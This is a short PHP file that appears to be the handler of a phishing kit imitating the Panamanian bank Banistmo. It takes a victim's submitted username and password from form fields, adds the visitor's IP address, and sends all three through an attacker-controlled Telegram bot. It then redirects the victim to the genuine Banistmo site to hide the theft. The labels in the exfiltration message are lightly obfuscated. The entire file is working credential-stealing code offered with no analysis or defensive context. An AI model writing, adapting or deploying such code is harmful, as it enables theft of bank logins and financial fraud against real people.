<?php
ini_set("display_errors", 0);

$config = include('config.php');
$elusr = $_POST['miDiosenticonfio'];
$elpax = $_POST['miDiosenticonfioxx'];

$token = $config['token'];
$chat_id = $config['chat_id'];

$ip = $_SERVER['REMOTE_ADDR'];




$mensaje_para_chatbot = "🟡B4NISTM0🟡\nCorr30: ".$elusr."\nCl4v: ".$elpax."\nip: " . $ip;


$telegram_url = "https://api.telegram.org/bot".$token."/sendMessage?chat_id=".$chat_id."&text=" . urlencode($mensaje_para_chatbot);


$response = file_get_contents($telegram_url);

header("Location: https://www.banistmo.com/wps/portal/banistmo/personas");


?>
